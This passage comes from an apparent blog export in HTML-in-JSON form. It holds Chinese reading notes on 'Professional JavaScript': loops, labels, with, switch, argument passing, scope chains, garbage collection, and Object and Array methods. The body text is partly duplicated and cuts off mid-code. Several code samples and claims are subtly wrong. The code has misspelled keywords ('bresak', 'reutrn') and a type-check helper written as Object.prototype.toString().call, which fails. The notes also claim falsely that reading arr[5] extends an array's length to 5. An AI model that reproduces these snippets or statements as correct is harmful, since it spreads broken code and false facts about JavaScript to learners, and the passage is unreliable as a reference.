class=\"line\">var obj = &#123;a:&apos;11&apos;, b:&apos;22&apos;&#125;；</span><br><span class=\"line\">obj.a = &apos;aa&apos;;</span><br><span class=\"line\">obj.b = &apos;bb&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 简化后：</span><br><span class=\"line\">var obj = &#123;a:&apos;11&apos;, b:&apos;22&apos;&#125;；</span><br><span class=\"line\">with(obj)&#123;</span><br><span class=\"line\">    var c = &quot;cc&quot;</span><br><span class=\"line\">    a = &apos;aa&apos;;</span><br><span class=\"line\">    b = &apos;bb&apos;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>with代码块形成一个作用域，就是obj。JS解析时，会将with代码块中的所有变量a/b/c当做局部变量，如果局部环境中找不到定义a/b，就从obj的属性中查找，如果找到了就覆盖obj中的变量，如果找不到，就从with所在的外部作用域中找。</p>\n<blockquote>\n<p>这意味着在 with 语句的代码块内部，每个变量首先被认为是一个局部变量，而如果在局部环境中找不到该变量的定义，就会查询location 对象中是否有同名的属性。如果发现了同名属性， 则以 location 对象属性的值作为变量的值。这样会导致性能下降，不推荐使用。</p>\n</blockquote>\n<ol start=\"6\">\n<li><strong>switch</strong><br>需要混合的时候，要加注释：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">switch(i)&#123;</span><br><span class=\"line\">    case 12:</span><br><span class=\"line\">        //合并两种情形</span><br><span class=\"line\">    case 13:</span><br><span class=\"line\">        console.log(&apos;hhh&apos;);</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case 14:</span><br><span class=\"line\">        console.log(&apos;14&apos;);</span><br><span class=\"line\">        bresak;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>据JS精粹这本书，贯穿的时候，每个都写break：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">switch(i)&#123;</span><br><span class=\"line\">    case 12:</span><br><span class=\"line\">    case 13:</span><br><span class=\"line\">        break;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//上面写法易出错，且很难发现，应该这么写</span><br><span class=\"line\">switch(i)&#123;</span><br><span class=\"line\">    case 12:</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case 13:</span><br><span class=\"line\">        break;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>switch使用的全等操作符，所以并不会进行数据类型转换</strong></p>\n<ol start=\"7\">\n<li><p><strong>函数</strong></p>\n<ul>\n<li>函数定义时不必指定是否返回值；</li>\n<li>如果加了return，只执行到return语句，后面的永远不会被执行，</li>\n<li>例外：try catch语句，如果有finally，即使在try 或catch中写了return，仍然会执行finally里的代码</li>\n<li>如果return语句不加返回值，默认将返回undefined</li>\n</ul>\n</li>\n<li><p><strong>参数</strong></p>\n<ul>\n<li>arguments可以与命名参数一起使用</li>\n<li>arguments与数组相似：可以用arguments[n]来访问值，有length属性。但不是数组，没有数组的方法：slice、splice、shift、unshift、push、pop、concat、join、sort、reverse</li>\n<li>arguments的值永远与命名参数的值保持同步，其与命名参数并不是访问相同的内存空间，但是值会同步，没有传递值的；命名参数值默认被赋予undefined</li>\n<li><p><strong> 函数所有传参都是按值传递，不可能通过引用传参 </strong><br>结论：对于数字、字符串等是将它们的值传递给了函数参数，函数参数的改变不会影响函数外部的变量；对于数组和对象等是将对象(数组)变量的值传递给了函数参数，这个值是指向对象(数组)的地址。</p>\n<p><strong>函数传参的过程是把函数外部的变量的值复制给函数的局部变量，这个局部变量是指arguments的某个值。</strong><br>这句话对于理解引用类型传参时也是按值传递非常重要，检验是否理解引用类型按值传参的一段代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function setName(obj) &#123;</span><br><span class=\"line\">    obj.name = &apos;aaa&apos;;</span><br><span class=\"line\">    var obj = new Object();</span><br><span class=\"line\">    obj.name = &apos;ccc&apos;;</span><br><span class=\"line\">    return obj;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var person = new Object();</span><br><span class=\"line\">person.name = &apos;bbb&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">var newPerson = setName(person);</span><br><span class=\"line\">console.log(person.name + &apos; | &apos; + newPerson.name); // aaa | ccc</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"二、变量、作用域和内存问题\"><a href=\"#二、变量、作用域和内存问题\" class=\"headerlink\" title=\"二、变量、作用域和内存问题\"></a>二、变量、作用域和内存问题</h1><ol>\n<li><p><strong>基本类型和引用类型的值</strong></p>\n<ul>\n<li>定义基本类型值和引用类型值的过程：创建一个变量并为该变量赋值</li>\n<li>基本类型值指的是简单的数据段，而引用类型值指可能有多个值构成的对象</li>\n<li>5种基本数据类型是按值访问的，因为可以操作保存在变量中的实际的值</li>\n<li>引用类型的值是保存在内存中的对象的地址。JavaScript不允许直接访问内存中的位置，也就是说不能直接操作对象的内存空间。</li>\n<li>操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的</li>\n</ul>\n</li>\n<li><p><strong>堆栈</strong></p>\n<p> 堆存储：类似书架与书，存取没有顺序，只要知道书的名字，就可以方便的取出想要的书<br> 栈存储：类似羽毛球筒与羽毛球，先存后取，后存先取，要拿中间某一个球必须先把它上面的球全拿出来</p>\n<p> 栈的优势是存取速度比堆快，缺点是存在栈中的数据大小与生存期必须是确定的，缺乏灵活性。堆的优势是可以动态分配内存大小，生存期也不必事先告诉编译器，垃圾收集器会自动地收走这些不再使用的数据，但是缺点是由于在运行时动态分配内存，所以存取速度较慢。</p>\n<p> 基本类型值，一旦赋值，大小就固定了，因此存储在栈内存中。引用类型的值，可以动态的改变，例如定义一个对象之后，还可以给它添加变量和方法，因此大小不固定，所以存储在堆内存中。</p>\n<p> js中的基础类型变量，都是存放在变量对象中，JavaScript属于高级语言，高级语言中严格意义上来说并没有堆栈的区分。但是一些特殊场景会在逻辑上实现栈的存取方式，这才有了堆与栈的不同。</p>\n<p> 理解堆栈存储：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Person(id,name,age)&#123; </span><br><span class=\"line\">    this.id = id; </span><br><span class=\"line\">    this.name = name; </span><br><span class=\"line\">    this.age = age; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">var num = 10; </span><br><span class=\"line\">var bol = true; </span><br><span class=\"line\">var str = &quot;abc&quot;; </span><br><span class=\"line\">var obj = new Object(); </span><br><span class=\"line\">var arr = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;]; </span><br><span class=\"line\">var person = new Person(100,&quot;jxl&quot;,22);</span><br></pre></td></tr></table></figure>\n<p> <a href=\"http://o798x2hdw.bkt.clouddn.com/stack.png\" target=\"_blank\" rel=\"noopener\">stack-pic</a></p>\n</li>\n<li><p><strong>赋值变量值</strong></p>\n<ul>\n<li>从一个变量向另一个变量复制基本类型值，会在变量对象上创建一个新值，然后把该值复制到为新变量分配的位置上。</li>\n<li>当复制引用类型的值时，会将原变量的值复制一份放到为新变量分配的空间中。不同的是这个值是一个指针，改变其中一个变量会影响到另一个变量<br><a href=\"http://o798x2hdw.bkt.clouddn.com/copy-variable.png\" target=\"_blank\" rel=\"noopener\">copy_variable-pic</a></li>\n</ul>\n</li>\n<li><p><strong>传递参数</strong></p>\n<ul>\n<li>JS中所有参数都是按值传递的</li>\n<li>把函数外部的值复制给函数内部参数，就和把值从一个变量复制到另一个变量一样</li>\n<li>传递引用类型值时传递的是指针，因此在函数中对局部变量参数的修改会反映到函数外部</li>\n<li>可以把函数参数想象成局部变量</li>\n</ul>\n</li>\n<li><p><strong>检测类型</strong></p>\n<ul>\n<li>检测基本类型值（number\\string\\undefined\\boolean）用typeof，检测引用类型值用instanceof</li>\n<li>如果是对象或<strong>null</strong>，typeof会返回”object”</li>\n<li>如果是function，typeof会返回”function”</li>\n<li><p>如果变量是给定引用类型的实例，instanceof 操作符就会返回 true</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var person = function()&#123;</span><br><span class=\"line\">  this.name = &quot;aa&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var bill  = new person();</span><br><span class=\"line\">console.log(bill instanceof person)  //true</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用instanceof检测基本类型值，始终返回false，因为基本类型值不是对象</p>\n</li>\n</ul>\n</li>\n<li><p><strong>执行环境及作用域</strong></p>\n<ul>\n<li><strong>执行环境（execution context）</strong>定义了变量或函数有权访问的其他数据</li>\n<li>每个函数有自己的执行环境，每个执行环境有一个相关联的<strong>变量对象(variable object)</strong>，保存环境中所有的变量和函数</li>\n<li>全局执行环境是最外围的执行环境，在web浏览器中是window对象，所有全局的变量和函数都是作为window的属性和方法</li>\n<li>某个执行环境的所有代码执行完毕后，该环境其中的变量和函数全部销毁</li>\n<li>而全局执行环境在程序退出时销毁，web浏览器中对应关闭网页时</li>\n<li><strong>ECMAScript程序的执行流：</strong>每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境就被推入一个环境栈中。函数执行后，栈将其环境弹出，把控制权返还给之前的执行环境</li>\n<li><strong>作用域链</strong>，作用域链前端，是当前执行的代码所在环境的变量对象，如果环境是函数，就把函数的<strong>活动对象（activation object）</strong>作为变量对象。活动对象最开始只包含一个变量，即arguments对象（全局环境中不包含），作用域链下一个变量对象来自包含环境，这样一直延续到全局环境。</li>\n<li><strong>延长作用域链</strong>：with和try catch中的catch块可以延长作用域链，即在作用域链的前端临时添加一个变量对象，该变量对象在代码执行完毕后被移除。</li>\n<li>对于catch语句，会创建一个新的变量对象，其中包含对被抛出的错误对象的声明。<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function withLocation()&#123;</span><br><span class=\"line\">    with(location)&#123;</span><br><span class=\"line\">        var url = href;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    reutrn url</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// with语句内部，定义了一个url变量，因而url就成了函数执行环境的一部分，所以可以作为函数的值被返回。</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<pre><code>- 标识符解析会沿着作用域链一级一级进行查找，直到找到声明变量的地方，假设局部环境有`var color = &quot;red&quot;`,此时在局部环境中只有使用`window.color`才可以访问在全局变量中定义的color\n- 变量查询有代价会比较慢，所以访问局部变量会比访问全局变量快，但现在差距几乎可以忽略\n</code></pre><ol start=\"7\">\n<li><p><strong>垃圾收集</strong></p>\n<ul>\n<li>JS具有自动垃圾收集机制，执行环境会负责管理代码执行过程中使用的内存，即内存分配和无用内存的回收</li>\n<li>这种自动垃圾收集机制的原理是：找出不再使用的变量，然后销毁释放其占用的内存。垃圾收集器会隔段时间就周期性地执行这一操作</li>\n<li>浏览器中对垃圾收集的实现方式包含：引用计数和标记清除两种</li>\n<li><strong>标记清除</strong>：当变量进入环境时（如在函数中声明一个变量）标记为“进入环境”，当变量离开环境时，标记为“离开环境”</li>\n<li><strong>引用计数</strong>：跟踪每个值被引用的次数，当引用次数为0时就在下一次垃圾收集器运行时销毁这个变量。</li>\n<li>当循环引用时，引用计数不能清除变量，会造成内存泄漏</li>\n<li>IE9之前版本中部分DOM和BOM对象不是原生JS对象，而是C++实现的COM对象，涉及到COM对象与原生JS对象的相互引用时，即使页面中的BOM对象\\DOM对象从页面移除了，他也不会被回收</li>\n<li>为了避免此类问题，在不使用的时候，手动断开DOM元素与原生JS对象间的连接</li>\n</ul>\n</li>\n<li><p><strong>管理内存</strong></p>\n<ul>\n<li>电脑分配给Web浏览器的内存比分给桌面程序的少，以避免浏览器耗尽内存引发系统崩溃</li>\n<li>这个内存限制，会对给变量分配内存造成影响，并影响调用栈以及在一个线程中同时执行的语句数量。</li>\n<li>所以为了获得更好的页面性能，需要注意<strong>优化内存使用</strong>，就是不使用的变量就解除引用，局部变量会在离开执行环境时自动解除引用，所以要注意的就是全局变量不使用时就解除引用。</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"三、引用类型\"><a href=\"#三、引用类型\" class=\"headerlink\" title=\"三、引用类型\"></a>三、引用类型</h1><ol>\n<li><p><strong>Object类型</strong></p>\n<ul>\n<li>创建Object实例包含两种方法：<code>new Object()</code>和对象字面量<code>var obj = {}</code>，使用对象字面量创建对象，不会调用Object构造函数</li>\n<li><code>var obj = {}</code>是一个表达式上下文，表达式上下文指的是能够返回一个值；<code>if(a==b)</code>是一个语句上下文</li>\n<li>在最后一个属性后面添加逗号，会在一些浏览器中导致错误</li>\n<li>属性名可以是数值，此时会自动转换为数值字符串</li>\n<li>在向函数传递大量可选参数时，最好的做法是对那些必需值使用命名参数，而使用对象字面量来封装多个可选参数</li>\n<li>访问对象属性有两种：点和方括号，方括号的优点是可以通过变量来访问属性<code>var a = &quot;name&quot;; console.log(person[a])</code>，并且可以兼容比较奇怪的属性名：<code>person[&quot;first name&quot;] = &quot;Nicholas&quot;;</code>通常使用点方法访问</li>\n</ul>\n</li>\n<li><p><strong>Array类型</strong></p>\n<ul>\n<li><p>创建Array实例的方式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Array构造函数方式</span><br><span class=\"line\">var arr1 = new Array(&quot;a&quot;,&quot;b&quot;);</span><br><span class=\"line\">var arr2 = Array(&quot;a&quot;, &quot;b&quot;);</span><br><span class=\"line\">var arr3 = Array(3);        </span><br><span class=\"line\"></span><br><span class=\"line\">// 数组字面量方式</span><br><span class=\"line\">var arr4 = [1,2,3];</span><br><span class=\"line\"></span><br><span class=\"line\">var arrFault = [,,,];  //不推荐!</span><br><span class=\"line\">var arrFault2 = [1,2,] //不推荐!</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在使用数组字面量表示法时，也不会调用 Array 构造函数【？】</p>\n</li>\n<li><p>关于length:</p>\n<ol>\n<li><p>如果索引值超出length，会自动以undefined补全长度</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var arr=[1,2,3]</span><br><span class=\"line\">console.log(arr[5])      //undefined</span><br><span class=\"line\">console.log(arr.length)  //5</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以通过设置length值，修改数组，截短或加长</p>\n</li>\n</ol>\n</li>\n<li><p>检测数组</p>\n<ol>\n<li>instanceof检测法<code>if(value instanceof Array)</code>，问题在于它假定只有一个全局执行环境，因为Array是window的属性。如果网页中包含多个frame，那实际上就存在多个window，即两个以上不同的全局执行环境，从而存在两个以上不同版本的 Array 构造函数。如果你从一个框架向另一个框架传入一个数组，那么传入的数组与在第二个框架中原生创建的数组分别具有各自不同的构造函数。</li>\n<li>ECMAScript 5 新增了 Array.isArray()方法。这个方法的目的是最终确定某个值到底是不是数组，而不管它是在哪个全局执行环境中创建的。兼容性IE9+</li>\n<li><p>22.1.1章节中的安全的类型检测的方法，可以解决低版本浏览器的类型检测问题</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function isArray(value)&#123;</span><br><span class=\"line\">    return Object.prototype.toString().call(value)==&quot;[object Array]&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>原理：在任何值上调用 Object 原生的 toString()方法，都会返回一个[object NativeConstructorName]格式的字符串。用来区分是否是JS原生对象，任何开发人员自定义的构造函数都将返回”[object Object]”。</p>\n</li>\n</ol>\n</li>\n<li>转换方法：toString、toLocaleString返回由每一项调用toString、toLocaleString得到的字符串组成的数组；valueOf返回原数组；arr.join(“”)拼接数组成字符串</li>\n<li>栈方法（后进先出）与队列方法（先进先出）<ol>\n<li>push / pop：数组末尾添加/删除，push可添加多项，返回数组长度；pop移除一项，返回被移除的项</li>\n<li>shift / unshift：在数组前端移除 / 添加一项，shift返回移除的项，unshift可添加多项，返回新数组长度</li>\n<li>shift和pop，都只能移除一项，返回移除的项；unshift和push都可增加多项，并返回新数组长度。</li>\n</ol>\n</li>\n<li><p>排序：reverse反序和sort排序</p>\n<ol>\n<li>sort用法<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arr.sort(fun)</span><br><span class=\"line\">function fun(a,b)&#123;</span><br><span class=\"line\">    return a-b</span><br><span class=\"line\">    // 返回负值，a排在前面；返回0，顺序不变；返回正值，a排在后面</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n</li>\n<li><p>操作方法：concat、slice、splice</p>\n<ol>\n<li>concat参数为数组时，是把每一项添加到原数组中，可以用来给多维数组降维</li>\n<li>slice方法可接受一或两个参数，即要返回项的起始和结束位置，不会影响原始数组，若参数中有一个负数，则用数组长度加上该数来确定相应的位置</li>\n<li>splice最强大的数组方法，可以删除、插入和替换，主要用途是向数组的中部插入项，会改变原数组。返回一个数组，包含从原数组中删除的项（如果没有删除任何项，返回空数组）<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">splice(0,2)</span><br><span class=\"line\">  //删除数组中的前两项</span><br><span class=\"line\">splice(2,0,&quot;red&quot;,&quot;green&quot;)</span><br><span class=\"line\">  //从当前数组的位置 2 开始插入字符串&quot;red&quot;和&quot;green&quot;</span><br><span class=\"line\">splice (2,1,&quot;red&quot;,&quot;green&quot;)</span><br><span class=\"line\">  //删除当前数组位置 2 的项，然后再从位置 2 开始插入字符串&quot;red&quot;和&quot;green&quot;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n</li>\n<li><p>位置方法：indexOf()和 lastIndexOf()，二者的区别在于，从头查和从尾查，在没查到的情况下返回-1。在比较第一个参数<br>与数组中的每一项时，<strong>使用全等（===）操作符</strong>。</p>\n</li>\n<li>迭代方法：every、filter、forEach、map、some，都不会修改原数组，传入的函数接收三个参数：数组项的值、该项在数组中的位置和数组对象本身。<code>function(item, index, arr){}</code><ol>\n<li>every()：对数组中的每一项运行给定函数，若该函数对每一项都返回 true，则返回 true</li>\n<li>filter()：对数组中的每一项运行给定函数，返回该函数会返回true项组成的数组</li>\n<li>forEach()：对数组中的每一项运行给定函数。这个方法没有返回值</li>\n<li>map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组</li>\n<li>some()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true</li>\n</ol>\n</li>\n<li>归并方法ruduce和reduceRight，迭代数组的所有项，然后构建一个最终返回的值，区别是左起遍历还是右起遍历。传给 reduce()和 reduceRight()的函数接收4参数：前一个值、当前值、项的索引和数组对象。该函数返回的值会作为第一个参数自动传给下一项。第一次迭代发生在数组的第二项上，因此第一个参数是数组的第一项，第二个参数就是数组的第二项。迭代和归并方法是ES5引入的方法，IE9+支持<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var values = [1,2,3,4,5];</span><br><span class=\"line\">var sum = values.reduce(function(prev, cur, index, array)&#123;</span><br><span class=\"line\">return prev + cur;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">alert(sum); //15</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<hr>\n<blockquote>\n<p>本文地址：<a href=\"http://supermaryy.com/2016/09/20/read-book-professional-javascript4\">http://supermaryy.com/2016/09/20/read-book-professional-javascript4</a></p>\n</blockquote>\n<p>Reference：</p>\n<ol>\n<li><a href=\"http://www.jianshu.com/p/996671d4dcc4#\" target=\"_blank\" rel=\"noopener\">前端基础进阶（一）：内存空间详细图解</a></li>\n<li><a href=\"http://www.2cto.com/kf/201506/409654.html\" target=\"_blank\" rel=\"noopener\">深入理解javascript之内存分配</a></li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>摘要：</p>\n<ol>\n<li>for in 循环如果属性值为null和undefined，ES3报错，ES5终止循环，故使用前需要检测值是否为null和undefined</li>\n<li>JS不存在块级作用域，所以for循环中定义的变量，循环外可访问</li>\n<li>for in循环实际使用前最好检测值是否为null或者是undefined</li>\n<li>label语句，给循环起个名字loopName，需要的时候就可以在循环中用break loopName跳出循环，或者continue loopName，多用在循环嵌套的时候</li>\n<li>switch语句使用全等操作符，所以并不会进行数据类型转换，数组的indexOf和laseIndexOf也使用全等操作符</li>\n<li>函数return的例外：遇到try catch语句，如果有finally，即使在try 或catch中写了return，仍然会执行finally里的代码</li>\n<li>arguments与数组相似：可以用arguments[n]访问值，有length属性。但没有数组的方法</li>\n</ol>","more":"<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a><br>本文地址：<a href=\"http://supermaryy.com/2016/09/20/read-book-professional-javascript4\">http://supermaryy.com/2016/09/20/read-book-professional-javascript4</a></p>\n</blockquote>\n<h1 id=\"一、语句\"><a href=\"#一、语句\" class=\"headerlink\" title=\"一、语句\"></a>一、语句</h1><ol>\n<li><p>for会自动调用Boolean()函数，把条件语句，转换成布尔值。</p>\n</li>\n<li><p>for(var i=0; i&lt;3; i++){} 循环中定义的变量i，循环外部也可以访问，因为JS不存在块级作用域</p>\n</li>\n<li><p><strong>for in循环</strong>可以遍历对象的属性，没有一定的顺序，如果属性值为null和undefined，ES3下会抛出错误，ES5中会中断循环，<del>但是实际执行时并没有中断</del>，所以实际使用前最好检测值是否为null或者是undefined：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 这种写法不会中断：</span><br><span class=\"line\">var x;</span><br><span class=\"line\">var aa = &#123; </span><br><span class=\"line\">    bb:null,</span><br><span class=\"line\">    cc:x,</span><br><span class=\"line\">    dd:&quot;1&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">for(var propName in aa)&#123;</span><br><span class=\"line\">console.log(aa[propName]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 结果：null/undefined/1</span><br><span class=\"line\"></span><br><span class=\"line\">// 这种写法会中断：</span><br><span class=\"line\">arr = new Array(3); // [undefined × 3]</span><br><span class=\"line\">arr.forEach(()=&gt;console.log(&apos;have done&apos;));  // 没有打印，浏览器语句返回值undefined</span><br><span class=\"line\">for(var i in arr) console.log(&apos;have done&apos;); // 没有打印，浏览器语句返回值undefined</span><br><span class=\"line\">for(var i of arr) console.log(&apos;have done&apos;); //3次&quot;have done&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>label 语句</strong><br>label语句主要是与for循环配合使用，结合break和continue，可以跳出循环。多用在循环嵌套的时候</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//下面例子结合break，continue同理</span><br><span class=\"line\">outLoop:</span><br><span class=\"line\">for(var i=0; i&lt;4; i++)&#123;</span><br><span class=\"line\">    innerLoop:</span><br><span class=\"line\">    for(var j=0; j&lt;4; j++)&#123;</span><br><span class=\"line\">        if(i==2 &amp;&amp; j==2)&#123;</span><br><span class=\"line\">            break outLoop;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        console.log(&apos;i:&apos;+i+&quot;,j:&quot;+j);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 输出值：</span><br><span class=\"line\"> i:0,j:0</span><br><span class=\"line\"> i:0,j:1</span><br><span class=\"line\"> i:0,j:2</span><br><span class=\"line\"> i:1,j:0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>with 语句</strong><br>简化对同一个对象的多次操作，如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123;a:&apos;11&apos;, b:&apos;22&apos;&#125;；</span><br><span class=\"line\">obj.a = &apos;aa&apos;;</span><br><span class=\"line\">obj.b = &apos;bb&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 简化后：</span><br><span class=\"line\">var obj = &#123;a:&apos;11&apos;, b:&apos;22&apos;&#125;；</span><br><span class=\"line\">with(obj)&#123;</span><br><span class=\"line\">    var c = &quot;cc&quot;</span><br><span class=\"line\">    a = &apos;aa&apos;;</span><br><span class=\"line\">    b = &apos;bb&apos;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>with代码块形成一个作用域，就是obj。JS解析时，会将with代码块中的所有变量a/b/c当做局部变量，如果局部环境中找不到定义a/b，就从obj的属性中查找，如果找到了就覆盖obj中的变量，如果找不到，就从with所在的外部作用域中找。</p>\n<blockquote>\n<p>这意味着在 with 语句的代码块内部，每个变量首先被认为是一个局部变量，而如果在局部环境中找不到该变量的定义，就会查询location 对象中是否有同名的属性。如果发现了同名属性， 则以 location 对象属性的值作为变量的值。这样会导致性能下降，不推荐使用。</p>\n</blockquote>\n<ol start=\"6\">\n<li><strong>switch</strong><br>需要混合的时候，要加注释：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">switch(i)&#123;</span><br><span class=\"line\">    case 12:</span><br><span class=\"line\">        //合并两种情形</span><br><span class=\"line\">    case 13:</span><br><span class=\"line\">        